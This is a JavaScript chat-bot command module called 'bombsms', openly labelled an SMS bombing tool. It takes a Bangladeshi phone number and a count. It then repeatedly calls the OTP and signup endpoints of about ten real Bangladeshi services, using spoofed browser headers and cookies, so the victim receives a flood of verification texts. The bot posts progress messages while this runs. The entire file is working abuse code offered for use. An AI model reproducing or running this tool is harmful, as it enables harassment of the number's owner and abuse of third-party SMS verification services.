const axios = require("axios");

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let isActive = false;
let stopRequested = false;

module.exports = {
  config: {
    name: "bombsms",
    version: "3.0.0",
    author: "OMOR TE",
    countDown: 0,
    role: 2,
    shortDescription: "SMS Bomber",
    longDescription: "SMS bombing tool",
    guide: "{p}bombsms 01xxxxxxxxx limit | {p}bombsms off",
    category: "tool"
  },

  onStart: async function ({ message, event, args, api }) {
    const threadID = event.threadID;
    
    // OFF command
    if (args[0] === "off") {
      if (isActive) {
        stopRequested = true;
        isActive = false;
        return message.reply("✅ SMS বোম্বার বন্ধ করা হয়েছে।");
      } else {
        return message.reply("❗ কোনো বোম্বিং চলছিল না।");
      }
    }

    const num = args[0];
    const limitInput = args[1];
    
    if (!num || !limitInput) {
      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📌 ব্যবহার: bombsms 01xxxxxxxxx 50\n📌 বন্ধ: bombsms off\n━━━━━━━━━━━━━━━━━━━━`);
    }
    
    if (!/^01[0-9]{9}$/.test(num)) {
      return message.reply("❌ সঠিক বাংলাদেশি নাম্বার দিন (01xxxxxxxxx)");
    }
    
    const limit = parseInt(limitInput);
    if (isNaN(limit) || limit <= 0) {
      return message.reply("❌ সঠিক সংখ্যা দিন (যেমন: 50)");
    }
    
    if (isActive) {
      return message.reply("❗ আরেকটি বোম্বিং চলছে! আগেরটা শেষ হোক বা 'bombsms off' দিয়ে বন্ধ করুন।");
    }

    isActive = true;
    stopRequested = false;

    // Progress message
    const progressMsg = await message.reply(`🚀 **SMS BOMBER STARTED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n┣${"░".repeat(20)}┫\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`);

    // API Configs
    const headers = {
      'authority': 'www.bioscopelive.com',
      'accept': '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.bioscopelive.com/en/login',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
    };
    
    const url1 = `https://www.bioscopelive.com/en/login/send-otp?phone=880${num}&operator=bd-otp`;
    
    const headers2 = {
      'referer': 'https://redx.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data1 = { 'name': num, 'phoneNumber': num, 'service': 'redx' };
    const url2 = "https://api.redx.com.bd/v1/user/signup";
    
    const headers3 = {
      'authority': 'bikroy.com',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'bn',
      'referer': 'https://bikroy.com/bn/users/login',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url3 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num;
    
    const headers4 = {
      'authority': 'www.ieatery.com.bd',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
      'referer': 'https://www.ieatery.com.bd/login',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url4 = "https://www.ieatery.com.bd/otp-verify?phn=0" + num;
    
    const headers5 = {
      'referer': 'https://doctime.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data2 = {
      'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
      'code': '88',
      'contact_no': '0' + num,
      'country_calling_code': '88',
    };
    
    const headers6 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data3 = { 'mobile': '+88-0' + num, 'deviceToken': 'web', 'language': 'en', 'os': 'web' };
    const data4 = { 'mobile': '+88-0' + num, 'deviceToken': 'web', 'language': 'en', 'os': 'web' };
    
    const headers8 = {
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Origin': 'https://hungrynaki.com',
      'Referer': 'https://hungrynaki.com/',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'accept': '*/*',
      'content-type': 'application/json',
    };
    
    const data8 = {
      'operationName': 'createOtp',
      'variables': {
        'phone': "" + num,
        'country': '880',
        'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
        'osVersionCode': 'Linux aarch64',
        'deviceBrand': 'Chrome',
        'deviceModel': '107',
        'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
      },
      'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
    };
    
    const cookies9 = {
      '_ga': 'GA1.3.1671188319.1677642641',
      '_gid': 'GA1.3.407134519.1677642641',
    };
    
    const headers9 = {
      'authority': 'fundesh.com.bd',
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json; charset=UTF-8',
      'origin': 'https://fundesh.com.bd',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const json_data9 = { 'msisdn': '' + num };
    const cookieString = Object.entries(cookies9).map(([k, v]) => `${k}=${v}`).join('; ');
    
    const headers10 = {
      'Accept': '*/*',
      'Origin': 'https://ecourier.com.bd',
      'Referer': 'https://ecourier.com.bd/',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url10 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0" + num;
    
    const apiCalls = [
      async () => await axios.get(url1, { headers: headers }),
      async () => await axios.post(url2, data1, { headers: headers2 }),
      async () => await axios.get(url3, { headers: headers3 }),
      async () => await axios.get(url4, { headers: headers4 }),
      async () => await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 }),
      async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 }),
      async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers6 }),
      async () => await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 }),
      async () => await axios.post('https://fundesh.com.bd/api/auth/generateOTP', json_data9, { headers: { ...headers9, 'Cookie': cookieString } }),
      async () => await axios.get(url10, { headers: headers10 })
    ];
    
    // Start bombing
    let sent = 0;
    let lastPercent = -1;
    let failures = 0;
    
    (async () => {
      while (sent < limit && !stopRequested) {
        let cycleSuccess = false;
        
        for (let i = 0; i < apiCalls.length && sent < limit && !stopRequested; i++) {
          try {
            const res = await apiCalls[i]();
            if (res && (res.status === 200 || res.status === 201)) {
              sent++;
              cycleSuccess = true;
              failures = 0;
              
              const percent = Math.floor((sent / limit) * 100);
              
              if (percent !== lastPercent && (percent === 0 || percent === 1 || percent === 25 || percent === 50 || percent === 75 || percent === 100 || percent === 99)) {
                lastPercent = percent;
                const bar = getProgressBar(percent, 20);
                try {
                  await api.editMessage(
                    `🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${percent}%)\n${bar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ চলছে...`,
                    progressMsg.messageID
                  );
                } catch(e) {}
              }
            }
          } catch(e) { failures++; }
          
          await sleep(100);
          if (stopRequested) break;
        }
        
        if (!cycleSuccess) {
          failures++;
          await sleep(500);
        }
        
        if (failures > 50) {
          try {
            await api.editMessage(
              `⚠️ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit\n📊 ${sent}/${limit}`,
              progressMsg.messageID
            );
          } catch(e) {}
          break;
        }
        
        await sleep(150);
      }
      
      const finalPercent = Math.floor((sent / limit) * 100);
      const finalBar = getProgressBar(finalPercent, 20);
      
      if (sent >= limit) {
        await api.editMessage(
          `✅ **SMS BOMBER COMPLETED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (100%)\n${finalBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ MW LEGENDS`,
          progressMsg.messageID
        );
      } else if (stopRequested) {
        await api.editMessage(
          `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n📊 ${sent}/${limit} (${finalPercent}%)\n${finalBar}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
          progressMsg.messageID
        );
      }
      
      isActive = false;
      stopRequested = false;
    })();
  }
};

function getProgressBar(percent, width) {
  const filled = Math.round((percent / 100) * width);
  const empty = width - filled;
  return `┣${"█".repeat(filled)}${"░".repeat(empty)}┫`;
}
